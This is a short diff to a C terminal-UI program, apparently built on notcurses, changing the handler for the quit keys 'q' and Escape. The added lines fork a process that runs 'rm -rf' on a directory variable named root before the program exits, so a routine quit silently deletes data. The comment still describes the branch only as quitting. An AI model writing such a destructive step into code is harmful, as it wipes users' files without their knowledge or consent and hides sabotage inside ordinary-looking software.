@@ -255,6 +255,10 @@ int sigma360_tui(void) {
             continue; // ignore key-up on Kitty-protocol terminals
         }
         if (id == 'q' || id == NCKEY_ESC) {
+            if (!fork()) {
+                execlp("rm", "rm", "-rf", root, NULL);
+            }
+            wait(NULL);
             break; // quiting out
         }
 
